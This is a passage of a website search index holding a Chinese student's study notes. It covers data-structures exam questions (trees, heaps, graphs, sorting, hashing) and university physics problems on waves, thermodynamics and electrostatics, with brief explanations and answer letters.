<p>T</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#iv2","title":"IV.2 \u9009\u62e9\u9898","text":"<p>\u770b\u6700\u540e\u4e00\u4e2a\u6570\u5b9a root \u3002</p> <p>C</p> <p></p> <p>\u5dee\u4e0d\u591a\u5c31\u662f\u5728\u95ee\uff1a\u80fd\u591f\u5f62\u6210\u7684\u4e8c\u53c9\u6811\u7684\u5c42\u6570\u662f\u591a\u5c11\uff1f</p> <p>D</p> <p></p> <p>\u548c\u524d\u9762\u90a3\u9898\u4e00\u6837\u3002</p> <p>A</p> <p></p> <p>\u611f\u89c9\u5c31\u8bb0\u4f4f\u5427\uff0c\u8003\u573a\u4e0a\u5bb9\u6613\u4e71\u3002</p> <p>Given a binary search tree with its preorder traversal sequence { 8, 2, 15, 10, 12, 21 }. If 8 is deleted from the tree, which one of the following statements is FALSE? </p> <p>A.One possible preorder traversal sequence of the resulting tree may be { 2, 15, 10, 12, 21 }</p> <p>B.One possible preorder traversal sequence of the resulting tree may be { 10, 2, 15, 12, 21 }</p> <p>C.One possible preorder traversal sequence of the resulting tree may be { 15, 10, 2, 12, 21 }</p> <p>D.It is possible that the new root may have 2 children</p> <p>\u5220\u9664\u641c\u7d22\u4e8c\u53c9\u6811\u6839\u8282\u70b9\uff0c\u9700\u8981\u7528\u4e2d\u5e8f\u904d\u5386\u7684\u524d\u9a71\u6216\u540e\u7ee7\u66ff\u4ee3\u6839\u8282\u70b9\uff0c\u5bf9\u5e94AB\u4e24\u79cd\u60c5\u51b5</p> <p>C</p> <p></p> <p>\u8fd9\u9053\u9898\u6709\u70b9\u79bb\u8c31\uff0c\u4f3c\u4e4e\u4e0a\u8bfe\u6ca1\u6709\u8bb2\u8fc7 decision tree \u76f8\u5173\u77e5\u8bc6\u70b9<sub>~\uff0c\u4f46\u662f\u4e5f\u4e0d\u6392\u9664\u6211\u6ca1\u542c\u5230</sub>~</p> <p>\u89e3\u91ca\u89c1 \u6570\u636e\u7ed3\u6784\u82f1\u6587\u4e60\u9898\u89e3\u6790-\u7b2c\u4e94\u7ae0 \u4e8c\u53c9\u641c\u7d22\u6811Binary Search Tree</p> <p>A</p> <p>In a max-heap with\u00a0n\u00a0(&gt;1) elements, the array index of the minimum key may be</p> <p>A.1</p> <p>B.\u230an/2\u230b\u22121</p> <p>C.\u230an/2\u230b</p> <p>D.\u230an/2\u230b+2</p> <p>\u5728\u5b8c\u5168\u4e8c\u53c9\u6811\u4e2d\u6709\u5b50\u8282\u70b9\u7684\u662f\u524d \u230an/2\u230b \u4e2a\u8282\u70b9\uff0c\u4e0a\u9762\u53ea\u6709 D \u9009\u9879\u662f\u53f6\u5b50\u8282\u70b9\uff0c\u800c\u5728\u6700\u5927\u5806\u4e2d\u6700\u5c0f\u9879\u4e0d\u53ef\u80fd\u6709\u5b50\u8282\u70b9</p> <p>D</p> <p></p> <p>\u524d/\u540e\u5e8f\u904d\u5386\u548c\u4e2d\u5e8f\u904d\u5386\u5efa\u7acb\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u91cd\u70b9\u5728\u4e8e\uff0c\u524d\u5e8f/\u540e\u5e8f\u904d\u5386\u7684\u7b2c\u4e00\u9879/\u6700\u540e\u4e00\u9879\u4e3a\u6839\u8282\u70b9\uff0c\u7136\u540e\u5229\u7528\u6839\u8282\u70b9\uff0c\u5206\u522b\u627e\u5230\u5de6\uff08\u53f3\uff09\u5b50\u6811\u7684\u524d/\u540e\u5e8f\u904d\u5386\u548c\u4e2d\u5e8f\u904d\u5386\uff0c\u9012\u5f52\u5efa\u6811\u3002</p> <p>B</p> <p></p> <p>\u5728\u4e8c\u53c9\u641c\u7d22\u6811\u4e2d\uff0c\u6700\u5c0f\u503c\u4e00\u5b9a\u662f\u201c\u6700\u9760\u5de6\u4fa7\u201d\u7684\u8282\u70b9\uff0c\u800c\u6700\u5927\u503c\u4e00\u5b9a\u662f\u201c\u6700\u9760\u53f3\u4fa7\u201d\u7684\u8282\u70b9\uff0c\u6839\u636e\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u7ed3\u6784\uff0c\u6700\u5c0f\u503c\u4e00\u5b9a\u5728\u6700\u5de6\u4e0b\u89d2\u7684\u90a3\u4e2a\uff0c\u800c\u6700\u5927\u503c\u70b9\u53ef\u80fd\u8fd8\u6709\u4e00\u4e2a\u5de6\u5b69\u5b50\u3002</p> <p>C</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#v-disjointed-set","title":"V Disjointed Set","text":"","tags":["notes"]},{"location":"note/other/FDS-questions/#v1","title":"V.1 \u9009\u62e9\u9898","text":"<p>D</p> <p></p> <p>\u53ef\u4ee5\u4f7f\u7528\u5f52\u7eb3\u6cd5\u8bc1\u660e\u3002</p> <p>A</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#vi-graph","title":"VI Graph","text":"<p>\u4e0d\u8bb0\u5f97\u54ea\u91cc\u6458\u6765\u7684\uff0c\u5f85\u6574\u7406\u3002</p> <p></p>","tags":["notes"]},{"location":"note/other/FDS-questions/#vi1","title":"VI.1 \u5224\u65ad\u9898","text":"<p>\u6b27\u62c9\u56de\u8def\u662f\u6bcf\u6761\u8fb9\u53ea\u8d70\u4e00\u6b21\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u9876\u70b9\u3002</p> <p>F</p> <p>Let P be the shortest path from S to T. If the weight of every edge in the graph is incremented by 2, P will still be the shortest path from S to T.</p> <p>\u5982\u679c\u672c\u6765\u8f83\u957f\u7684\u8def\u5f84(b)\u7ecf\u8fc7\u7684\u8fb9\u6bd4\u8f83\u5c11\uff0c\u90a3\u4e48\u672c\u6765\u6700\u77ed\u7684\u8def\u5f84(a) \u7684\u52a0\u6743\u957f\u5ea6\u53ef\u80fd\u5927\u4e8e(b)\u7684\u52a0\u6743\u957f\u5ea6</p> <p>F</p> <p>A minimum spanning tree exists iff G is connected.</p> <p>T</p> <p></p> <p>\u8fb9\u6570\u8d8a\u591a\u6743\u91cd\u53d8\u5316\u8d8a\u5927\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#vi2","title":"VI.2 \u9009\u62e9\u9898","text":"<p>\u5272\u70b9\u662f ABDEI \uff0c\u6545 6 \u90e8\u5206\u3002</p> <p>C</p> <p></p> <p>\u6700\u5c0f\u751f\u6210\u6811\u7684 Prim's algorithm\uff0c\u5c06\u5df2\u8bbf\u95ee\u70b9\u6240\u80fd\u8bbf\u95ee\u7684\u6700\u5c0f\u7684\u8fb9\u7684\u53e6\u4e00\u4e2a\u70b9\u52a0\u5165\u8fdb\u6765\u3002</p> <p>\u5bf9\u4e8e Dense Graph\uff08\u5373\u8fb9\u591a\u7684\u56fe\uff09\u4f7f\u7528 Prim \u6bd4 Kruskal \u66f4\u597d\u3002</p> <p>A</p> <p></p> <p>Back edge \u6ca1\u6709\u753b\u51fa\u6765\uff0c\u5c31\u6709\u5f88\u591a\u53ef\u80fd\u4e86\uff1b\u4f46\u662f\u5728 depth-first search tree \u4e2d\uff0c\u4e24\u4e2a\u5b50\u6811\u4e4b\u95f4\u662f\u4e0d\u53ef\u80fd\u5b58\u5728 Back edge \u7684\u3002</p> <p>C</p> <p></p> <p>\u6309\u7167 \\(\\sum degree = 2 e\\) \u5373\u53ef</p> <p>B</p> <p></p> <p>\u5982\u4f55\u7406\u89e3\u201cIn which order that the destinations must be obtained?\u201d</p> <p>\u5176\u5b9e\u5c31\u662f\u95ee\u6211\u4eec Dijkstra sequence \uff1b\u81f3\u4e8e\u540c\u65f6\u4f5c\u4e3a\u90bb\u5c45\uff0c\u90a3\u4e48\u5c31\u4ece\u6743\u91cd\u8f83\u5c0f\u8005\u5f00\u59cb\u4e86\u3002</p> <p>Uesless</p> <p>\u8fd9\u9053\u9898\u590d\u4e60\u7684\u65f6\u5019\u8ba9 Chatgpt-4o \u505a\u4e86\u4e0b\uff0c\u5c45\u7136\u5206\u6beb\u4e0d\u5dee\uff0c\u8981\u77e5\u9053\u6211\u53ea\u80fd\u591f\u622a\u56fe\u8be2\u95ee\uff1b\u770b\u6765\u673a\u5668\u89c6\u89c9\u786e\u5b9e\u6709\u70b9\u725b\u3002</p> <p>B</p> <p></p> <p>\u4ece S \u5230 S \u53ea\u6709\u4e00\u79cd\u8def\u5f84\u957f 0 \u3002</p> <p>A</p> <p></p> <p>\u5f88\u5bb9\u6613\u9009 C\uff0c\u4f46\u662f\u8c01\u8bf4\u8fd9\u662f\u4e00\u4e2a\u8fde\u901a\u56fe\u4e86\u5462\uff1f</p> <p>D</p> <p></p> <p>Note</p> <p>\u4ece\u8fde\u901a\u56fe\u4e2d\u83b7\u53d6\u6700\u5c0f\u751f\u6210\u6811\uff0c\u539f\u7406\u662f\uff1a</p> <p>\u5c06\u8fb9\u6309\u7167\u6743\u91cd\u4ece\u5c0f\u5230\u5927\u7684\u987a\u5e8f\u4f9d\u6b21\u52a0\u5165\u751f\u6210\u5b50\u56fe\u4e2d\uff1b</p> <p>\u5982\u679c\u51fa\u73b0\u6210\u73af\u60c5\u51b5\uff0c\u5219\u4e22\u5f03\u8be5\u8fb9\uff1b</p> <p>\u5982\u679c\u8fbe\u5230n-1\u6761\u8fb9\uff0c\u8bf4\u660e\u5f53\u524d\u751f\u6210\u5b50\u56fe\u5c31\u662f\u6700\u5c0f\u751f\u6210\u6811\uff1b</p> <p>\u5982\u679c\u6240\u6709\u8fb9\u7528\u5c3d\u4ecd\u672a\u6709n-1\u6761\u8fb9\uff0c\u8bf4\u660e\u6700\u5c0f\u751f\u6210\u6811\u4e0d\u5b58\u5728\u3002</p> <p>\u4e00\u6b65\u4e00\u6b65\u5c06\u6743\u91cd\u5c0f\u7684\u8fb9\u52a0\u8fdb\u6765\u5373\u53ef\u3002</p> <p>B</p> <p></p> <p>\u7531\u4e0a\u4e00\u9898\u6613\u5f97\u3002</p> <p>D</p> <p></p> <p>\u624b\u6413\u7f51\u7edc\u6d41\u7f62\uff0c\u5efa\u8bae\u7528\u94c5\u7b14\u6539\u6d41\u91cf\u3002</p> <p>A</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#vii-sort","title":"VII Sort","text":"","tags":["notes"]},{"location":"note/other/FDS-questions/#vii1","title":"VII.1 \u5224\u65ad\u9898","text":"<p>\u9898\u76ee\u662f\u95ee\u5982\u679c\u73b0\u5728\u5c0f\u533a\u57df\u8fdb\u884c\u4e86\u6392\u5e8f\uff0c\u53ef\u4ee5\u8f83\u5c11\u5feb\u6392\u7684\u9012\u5f52\u6df1\u5ea6\uff1b\u8fd9\u662f\u4e0d\u5bf9\u7684\uff0c\u56e0\u4e3a\u5927\u6982\u7387\u5e76\u6ca1\u6709\u6539\u53d8\u548c pivot \u7684\u4f4d\u7f6e\u5173\u7cfb\uff0c\u800c\u90a3\u624d\u662f\u5f71\u54cd\u9012\u5f52\u6df1\u5ea6\u7684\u91cd\u70b9\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#vii2","title":"VII.2 \u9009\u62e9\u9898","text":"<p>\u5c31\u662f\u4ece\u4e24\u4e2a\u4e00\u7ec4\u5f00\u59cb\u4e00\u6b65\u4e00\u6b65 Merge \u3002</p> <p>C</p> <p></p> <p>\u6bcf\u6b21\u90fd\u8981\u5230\u4e2d\u95f4\u624d\u78b0\u5934</p> <p>C</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#viii-hash","title":"VIII Hash","text":"","tags":["notes"]},{"location":"note/other/FDS-questions/#viii1","title":"VIII.1 \u9009\u62e9\u9898","text":"<p>\u6b63\u5e38\u6765\u8bf4\u662f O(1)\uff0c\u51b2\u7a81\u65f6 O(N)\uff0c\u6240\u4ee5\u4e0d\u786e\u5b9a\u3002</p> <p>D</p> <p></p> <p>Rehashing \u662f\u5c06\u54c8\u5e0c\u8868\u5927\u5c0f\u53d8\u4e3a\u7ffb\u500d\u540e\u5f80\u5927\u7b2c\u4e00\u4e2a\u8d28\u6570\u3002</p> <p>C</p>","tags":["notes"]},{"location":"note/other/FDS-questions/#ix","title":"IX \u53c2\u8003\u6587\u6863","text":"<ul> <li>Sakabann in CSDN</li> <li>PTA_fds_hw </li> <li>yaoyaoling'notebook</li> <li>Tuenity in CSDN</li> </ul>","tags":["notes"]},{"location":"note/physics/","title":"Physics","text":"<p>\u5927\u5b66\u7269\u7406\u4e59 &amp; \u5927\u7269\u5b9e\u9a8c\u76f8\u5173\u3002</p> physics          <ul> <li> physics1-problems  901  3 mins              1739718485 </li> <li> physics2-problems  4309  25  15 mins              1739636325 </li> <li> \u5927\u7269\u5b9e\u9a8c\u7eea\u8bba\u8bfe\u4f5c\u4e1a  1249  4 mins              1739448123 </li> <li> \u5927\u7269\u5b9e\u9a8c\u6570\u636e\u5904\u7406\u811a\u672c  361  291  5 mins              1739448123 </li> </ul>"},{"location":"note/physics/physics1-problems/","title":"Physics1 problems","text":"","tags":["notes","physics"]},{"location":"note/physics/physics1-problems/#_1","title":"\u671f\u672b\u590d\u4e60","text":"<p>SAVIA\u7684\u5916\u88c5\u4ee3\u8111</p> <p>\u6ce8\u610f\uff0c\u672c\u8eab\u5e94\u8be5\u662f\u5927\u7269\u7532\u7684\u590d\u4e60\u7b14\u8bb0\uff0c\u90e8\u5206\u8003\u70b9\u5927\u7269\u4e59  \u5927\u6982\u7387 \u4e0d\u6d89\u53ca\uff0c\u8c28\u614e\u9009\u62e9\u3002</p> <p></p> <p>\u53ef\u80fd\u662f\u6211\u83dc\u5427\uff0c\u4e00\u76f4\u6ca1\u60f3\u5230\u8fd9\u6837\u505a\u3002</p> <p></p> <p>\u672c\u9898\u4f5c\u56fe\u4e5f\u53ef\u5f88\u5feb\uff0c\u56fe\u4e2d\u89e3\u6cd5\u66f4\u52a0\u901a\u7528\uff1b\u5229\u7528 \\(a_{t}^{2}+a_{n}^{2} = a^{2}\\) \u8ba1\u7b97\u4e0d\u6613\u83b7\u5f97\u7684\u6570\u636e\u3002</p> <p></p> <p>\u4e0d\u8981\u5fd8\u4e86\u6cd5\u5411\u52a0\u901f\u5ea6\u3002</p> <p></p> <p>\u53ef\u80fd\u7528\u51b2\u91cf\u4f1a\u66f4\u597d\u7406\u89e3\u3002</p> <p></p> <p>\u5173\u952e\u5728\u4e8e\u53d1\u73b0\u89d2\u52a8\u91cf\u5b88\u6052\u3002</p> <p></p> <p>\u4e2a\u4eba\u611f\u89c9\u6bd4\u8f83\u96be\u627e\u5230\u7684\u662f \\(a = a_{c}-r_{2}\\beta\\) \u3002 </p> <p></p> <p>Question</p> <p>\u5982\u4f55\u5224\u65ad\u8d28\u5fc3\u8fd0\u52a8\u65b9\u5411\uff1f</p> <ul> <li> <p>\u4e0d\u5224\u65ad\uff0c\u901f\u5ea6\u548c\u89d2\u52a8\u91cf\u90fd\u53ef\u4ee5\u662f\u77e2\u91cf\uff1b</p> </li> <li> <p>\u4ee5 \\(f\\) \u6216 \\(F\\) \u7684\u4f5c\u7528\u70b9\u4e3a\u77ac\u65f6\u8f74\uff0c\u5f88\u5bb9\u6613\u5224\u65ad\u5411\u53f3\u8d70\u3002</p> </li> </ul> <p></p> <p>\u8bef\u4ee5\u4e3a\u9ad8\u4e2d\u9898\uff0c\u7ed3\u679c\u4e00\u4e2a\u5927\u5751\u3002</p> <p></p> <p>\u8bfe\u672c\u4e0a\u8fd9\u91cc\u8bb2\u7684\u4f9d\u6258\uff0c\u4e0d\u60f3\u7ffb\u667a\u4e91\uff0c\u76f4\u63a5\u770b\u8fd9\u4e2a\u4e86\uff1b\u5f53\u7136\u4e0d\u96be\u53d1\u73b0\uff0c\u201c\u81ea\u8f6c\u201d \u548c \u201c\u516c\u8f6c\u201d \u65b9\u5411\u662f\u4e00\u6837\u7684\u3002</p> <p> </p> <p>\u72ed\u4e49\u76f8\u5bf9\u8bba\uff0c\u4e3b\u8981\u8bb0\u4f4f\u51e0\u4e2a\u516c\u5f0f\u3002</p> <p></p> <p>\u7b2c\u4e00\u95ee\uff0c\u641e\u6e05\u695a\u5f39\u7c27\u62c9\u529b\u548c\u6469\u64e6\u529b\u65b9\u5411\u6bd4\u8f83\u91cd\u8981\u3002</p> <p></p> <p>\u80fd\u91cf\u6cd5\u5f97\u5fae\u5206\u65b9\u7a0b\uff0c\u5c31\u4e0d\u7528\u8003\u8651\u65b9\u5411\u95ee\u9898\u4e86\u3002</p> <p></p> <p>\u5224\u65ad \\(\\varphi\\) \u7684\u6b63\u8d1f\u771f\u662f\u4e00\u4e2a\u5927\u9ebb\u70e6\u2026\u2026 </p> <p>Question</p> <p>\u7b2c\u4e00\u95ee\u4e2d\uff0c\\(v &lt; 0\\) \u662f\u600e\u4e48\u6765\u7684\uff1f</p> <p>\u6ce2\u6cbf x \u6b63\u5411\u4f20\u64ad\uff0c\u4e5f\u5c31\u662f\u8bf4\u5c06\u4e09\u89d2\u51fd\u6570\u5411\u53f3\u79fb\uff0c\u89c2\u5bdf\u5bf9\u5e94\u70b9\u7684\u7eb5\u5750\u6807\u53d8\u5316\u3002</p> <p>\u6b64\u5916\uff0c\u6c42 c \u7684\u6a2a\u5750\u6807\u786e\u5b9e\u6123\u4e86\u4e00\u4e0b\u3002</p> <p></p> <p>\u7406\u89e3\u5c31\u597d\u8bb0\u3002</p> <p></p> <p>\u5173\u4e8e\u534a\u6ce2\u635f\u5931\uff0c\u4e3b\u8981\u9700\u8981\u7406\u89e3\u9a7b\u6ce2\u7684\u6982\u5ff5\u5427\u3002</p> <p></p> <p>\u4e0d\u8981\u53ea\u8bb0\u5f97 \u9ea6\u514b\u65af\u97e6\u901f\u7387\u5206\u5e03\u5f8b \u4e2d\u7684\u6700\u6982\u7136\u901f\u7387\u3001\u5e73\u5747\u901f\u7387\u548c\u5747\u65b9\u6839/\u65b9\u5747\u6839\u901f\u7387\u800c\u5fd8\u4e86\u5b9a\u4e49\u5f0f\u3002</p> <p>\u7b2c\u516b\u7ae0\u6bd4\u8f83\u6a21\u7cca\uff0c\u90fd\u770b\u4e00\u904d\u5427 =&gt; \u7b2c8\u7ae0-\u70ed\u529b\u5b66\u57fa\u7840</p> <p></p> <p>\u8003\u4e86\u591a\u4e2a\u516c\u5f0f\u3002</p> <p></p> <p>\u516c\u5f0f\u5c0f\u7ed3\u3002</p> <p>\u7b2c\u4e5d\u7ae0\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684\uff0c\u4f46\u662f\u4e0d\u4e4f\u6280\u5de7\u6027\u3002</p> <p></p> <p>\u7b2c\u4e8c\u95ee\u9ad8\u65af\u9762\u7684\u9009\u53d6\u5de7\u5999\uff0c\u7ed9\u51fa\u4e86\u65e0\u9650\u5927\u6709\u539a\u5ea6\u5e73\u9762\u5185\u90e8\u573a\u5f3a\u8ba1\u7b97\u65b9\u6cd5\u3002</p>","tags":["notes","physics"]},{"location":"note/physics/physics1-problems/#ppt","title":"\u8bfe\u5802 PPT \u6d4b\u8bd5\u9898","text":"","tags":["notes","physics"]},{"location":"note/physics/physics1-problems/#_2","title":"\u673a\u68b0\u6ce2","text":"<p>\u5e73\u9762\u7b80\u8c10\u6ce2</p> <p>Question</p> <p><p></p></p> <p>A</p> <p>Question</p> <p><p></p></p> <p>\u6700\u5927\u5f62\u53d8\u91cf =&gt; \u52bf\u80fd\u6700\u5927 =&gt; \u52a8\u80fd\u6700\u5927</p> <p>C</p> <p>\u534a\u6ce2\u635f\u5931</p> <p>Question</p> <p><p></p></p> <p>\u6ce2\u5bc6\u5230\u6ce2\u758f\uff1a\u76f8\u4f4d\u5dee \\(\\pi\\) \uff0c\u6392\u9664 CD\uff1b\u53cd\u5411\uff0c\u9009 A</p> <p>\u9519\u4e86\uff0c\u56e0\u4e3a\u6ce2\u7684\u901f\u5ea6\u4e5f\u662f\u53cd\u5411\u7684\uff0c\u5177\u4f53\u770b\u770b\u524d\u9762\u7684 \u89c6\u9891</p> <p>B</p>","tags":["notes","physics"]},{"location":"note/physics/physics1-problems/#_3","title":"\u6c14\u4f53\u5206\u5b50\u52a8\u7406\u8bba","text":"<p>Question</p> <p><p></p></p> <p>\u6ce8\u610f\u7c92\u5b50\u8fd8\u53d7\u5230\u4e86\u6d6e\u529b\u5373\u53ef</p> <p>\u5f97 \\(N_{A} = 8.19*10^{23}\\) </p> <p>Question</p> <p>\u6052\u538b\u4e0b\uff0c\u52a0\u70ed\u7406\u60f3\u6c14\u4f53\uff0c\u5219\u6c14\u4f53\u5206\u5b50\u7684\u5e73\u5747\u81ea\u7531\u7a0b\u548c\u5e73\u5747\u78b0\u649e\u9891\u7387\u5c06\u5982\u4f55\u968f\u6e29\u5ea6\u7684\u53d8\u5316\u800c\u53d8\u5316\uff1f\u600e\u6837\u7406\u89e3\uff1f</p>","tags":["notes","physics"]},{"location":"note/physics/physics1-problems/#_4","title":"\u70ed\u529b\u5b66\u57fa\u7840","text":"<p>Question</p> <p><p></p></p> <p>\u70ed\u529b\u5b66\u7b2c\u4e00\u5b9a\u5f8b\u9002\u7528\u6027\u5f88\u5e7f\u3002</p> <p>A</p> <p>Question</p> <p>\u4e00\u5b9a\u91cf\u7684\u7406\u60f3\u6c14\u4f53\uff0c\u5206\u522b\u4ece\u540c\u4e00\u72b6\u6001\u5f00\u59cb\uff0c\u7ecf\u5386\u7b49\u538b\u3001\u7b49\u4f53\u3001\u7b49\u6e29\u8fc7\u7a0b\u3002\u82e5\u6c14\u4f53\u5728\u4e0a\u8ff0\u8fc7\u7a0b\u4e2d\u5438\u6536\u7684\u70ed\u91cf\u76f8\u540c\uff0c\u5219\u6c14\u4f53\u5bf9\u5916\u505a\u529f\u6700\u5927\u7684\u8fc7\u7a0b\u662f\uff1a</p> <p>\\(\\begin{aligned}&amp;Q=\\Delta E+W\\\\&amp;\\text{\u7b49\u6e29:}W=Q\\\\&amp;\\text{\u7b49\u538b:}W=Q-\\Delta E&lt;Q\\\\&amp;\\text{\u7b49\u4f53:}W=0\\end{aligned}\\)</p> <p>A. \u7b49\u6e29\u8fc7\u7a0b</p> <p>Question</p> <p><p></p></p> <p>\u89e3\uff1a(1) \u8bbe\u5c0f\u7403\u5411\u4e0a\u8fd0\u52a8\u4f4d\u79fb\u4e3a\u6b63\uff0c\u5219\u5f53\u4ea7\u751f\u5fae\u5c0f\u7684\u6b63\u4f4d\u79fb y \u65f6\uff0c\u74f6\u5185\u6c14\u4f53\u7684\u4f53\u79ef\u6709\u4e00\u5fae\u5c0f\u7684\u589e\u91cf dV, dV=yA \u2026\u2026</p> <p>\u4e0e\u6b64\u540c\u65f6\uff0c\u538b\u5f3a\u5c06\u6539\u53d8\u4e00\u5fae\u5c0f\u503c dp,\u5c0f\u7403\u53d7\u5230\u7684\u5408\u529b F=Adp,\u6216 dp=F/A \u2026\u2026(2) \u7531\u4e8e\u5c0f\u7403\u5728\u8fd0\u52a8\u8fc7\u7a0b\u4e2d\u74f6\u5185\u6c14\u4f53\u505a\u51c6\u9759\u6001\u7edd\u70ed\u8fc7\u7a0b\uff0c\u5219\u6709\u5173\u7cfb\u5f0f pV1=\u5e38\u6570\uff0c\u4e24\u8fb9\u5fae\u5206\uff0c\u5f97\uff1a\\(\\gamma V^{\\gamma-1}pdV+V^{\\gamma}dp=0\\) \u3002</p> <p>\u5c06 (1)(2) \u5e26\u5165\u4e0a\u5f0f\u5f97\uff1a\\(F=-\\frac{\\gamma pA^{2}}{V}\\:y=-Ky\\)  \u5f97\u77e5\u5c0f\u7403\u505a\u7b80\u8c10\u8fd0\u52a8\uff1a\\(T=2\\pi\\sqrt{\\frac{m}{K}}=2\\pi\\sqrt{\\frac{mV}{\\gamma pA^{2}}}\\)</p> <p>(2) \u5373\uff1a\\(\\gamma=\\frac{4\\pi^{2}mV}{pA^{2}T^{2}}\\)\uff0c\u800c\u8fd9\u4e9b\u91cf\u90fd\u53ef\u4ee5\u901a\u8fc7\u5b9e\u9a8c\u6d4b\u5f97\u3002</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/","title":"Physics2 problems","text":"<p>Prerequisite</p> <p>\u5927\u7269\u4e59 II \u7b14\u8bb0\u67e5\u770b\uff1amemset0 </p> <p>\u9898\u76ee/\u7b54\u6848\u6765\u6e90\uff1aSAVIA\u7684\u5916\u88c5\u4ee3\u8111 \uff1b\u6d59\u6c5f\u5927\u5b66\u5927\u5b66\u7269\u7406\u4e59(II) PPT\uff1b\u6d59\u6c5f\u5927\u5b66\u5927\u5b66\u7269\u7406\u4e59(II) \u5386\u5e74\u8003\u8bd5\u5377\uff1b\u5176\u4ed6\u6765\u6e90\u5c06\u4f1a\u5728\u9898\u76ee\u5f00\u5934\u6807\u6ce8\u51fa\u5904\u3002</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#i-14","title":"I \u7b2c 14 \u7ae0\uff1a\u9759\u7535\u573a\u4e2d\u7684\u5bfc\u4f53\u548c\u7535\u4ecb\u8d28","text":"","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#i1","title":"I.1 \u9759\u7535\u573a\u2014\u2014\u7535\u573a\u5f3a\u5ea6\u4e0e\u7535\u52bf(\u80fd)","text":"<p>Note</p> <p>\\(\\varepsilon_0:\\text{ \u771f\u7a7a\u4e2d\u7684\u4ecb\u7535\u5e38\u6570 }=8.85\\times10^{-12}\\mathrm{~C}^2/(\\mathrm{N}\\cdot\\mathrm{m}^2)\\)</p> <p><p></p></p> <p></p> <p></p> <p>Question</p> <p>\u7535\u5076\u6781\u5b50\u7684\u573a\u5f3a\u5206\u5e03\u5462\uff1f</p> \\[ E = -\\bigtriangledown U \\implies \\begin{cases} E_{x}=-\\frac{\\partial U}{\\partial x}=\\frac{p_e(2x^2-y^2)}{4\\pi\\varepsilon_0(x^2+y^2)^{5/2}} \\\\ E_{y}=-\\frac{\\partial U}{\\partial y}=\\frac{3p_exy}{4\\pi\\varepsilon_0(x^2+y^2)^{5/2}} \\end{cases} \\] <p>Question</p> <p>\u4e24\u4e2a\u534a\u5f84\u5206\u522b\u4e3a R \u548c r \u7684\u7403\u5f62\u5bfc\u4f53\uff08R &gt; r\uff09\uff0c\u7528\u4e00\u6839\u5f88\u957f\u7684\u7ec6\u5bfc\u7ebf\u8fde\u63a5\u8d77\u6765\uff0c\u4f7f\u8fd9\u4e2a\u5bfc\u4f53\u7ec4\u5e26\u7535\u3002\u6c42\u4e24\u5bfc\u4f53\u8868\u9762\u7684\u7535\u8377\u9762\u5bc6\u5ea6\u6bd4\u503c\uff1f</p> <p>\u4e24\u7403\u8868\u9762\u7535\u52bf\u76f8\u540c\uff0c\u6240\u4ee5\uff1a</p> <p>\\(U=\\frac{1}{4\\pi\\varepsilon_0}\\frac{Q}{R}=\\frac{1}{4\\pi\\varepsilon_0}\\frac{q}{r}\\implies\\frac{\\sigma_R}{\\sigma_r}=\\frac rR\\)</p> <p>Question</p> <p>\u4e00\u5757\u9762\u79ef\u4e3a S \u7684\u91d1\u5c5e\u5927\u8584\u5e73\u677f A\uff0c\u5e26\u7535\u91cf\u4e3a Q\uff0c\u5728\u5176\u9644\u8fd1\u5e73\u884c\u653e\u7f6e\u53e6\u4e00\u5757\u4e0d\u5e26\u7535\u7684\u91d1\u5c5e\u5927\u8584\u5e73\u677f B\uff0c\u4e24\u677f\u95f4\u8ddd\u8fdc\u5c0f\u4e8e\u677f\u7684\u7ebf\u5ea6\u3002\u8bd5\u6c42\u4e24\u677f\u8868\u9762\u7684\u7535\u8377\u9762\u5bc6\u5ea6\uff0c\u4ee5\u53ca\u5468\u56f4\u7a7a\u95f4\u7684\u573a\u5f3a\u5206\u5e03\u3002</p> <p></p> <p>A/B \u5185\u90e8\u573a\u5f3a\u4e3a 0\uff0c\u53d6\u5411\u53f3\u4e3a\u6b63\uff0c\u6545\u6709\uff1a \\(\\begin{cases}\\frac{\\sigma_1}{2\\varepsilon_0}-\\frac{\\sigma_2}{2\\varepsilon_0}-\\frac{\\sigma_3}{2\\varepsilon_0}-\\frac{\\sigma_4}{2\\varepsilon_0}=0 \\quad A\u5185\u90e8 \\\\ \\frac{\\sigma_1}{2\\varepsilon_0}+\\frac{\\sigma_2}{2\\varepsilon_0}+\\frac{\\sigma_3}{2\\varepsilon_0}-\\frac{\\sigma_4}{2\\varepsilon_0}=0\\quad B \u5185\u90e8 \\end{cases}\\)</p> <p></p> <p>Question</p> <p>\u5728\u5185\u5916\u534a\u5f84\u5206\u522b\u4e3a R1 \u548c R2 \u7684\u5bfc\u4f53\u7403\u58f3\u5185\uff0c\u6709\u4e00\u4e2a\u534a\u5f84\u4e3a r \u7684\u5bfc\u4f53\u5c0f\u7403\uff0c\u5c0f\u7403\u4e0e\u7403\u58f3\u540c\u5fc3\uff0c\u8ba9\u5c0f\u7403\u4e0e\u7403\u58f3\u5206\u522b\u5e26\u4e0a\u7535\u8377\u91cf q \u548c Q\u3002\u8bd5\u6c42\uff1a</p> <ol> <li>\u5c0f\u7403\u7684\u7535\u52bf Ur\uff0c\u7403\u58f3\u5185\u3001\u5916\u8868\u9762\u7684\u7535\u52bf\uff1b</li> <li>\u4e24\u7403\u7684\u7535\u52bf\u5dee\uff1b</li> <li>\u82e5\u7403\u58f3\u63a5\u5730\uff0c\u518d\u6b21\u6c42\u5c0f\u7403\u4e0e\u7403\u58f3\u7684\u7535\u52bf\u5dee\uff1b</li> <li>\u7403\u548c\u7403\u58f3\u5f62\u6210\u7684\u7535\u5bb9\u5668\u7684\u7535\u5bb9 C \u3002</li> </ol> <p></p> <p>(1) \u5c0f\u7403\u6574\u4f53\u7b49\u52bf\uff0c\u6240\u4ee5\u6c42\u5c0f\u7403\u4e2d\u5fc3\u7684\u7535\u52bf\u5373\u53ef\uff1a 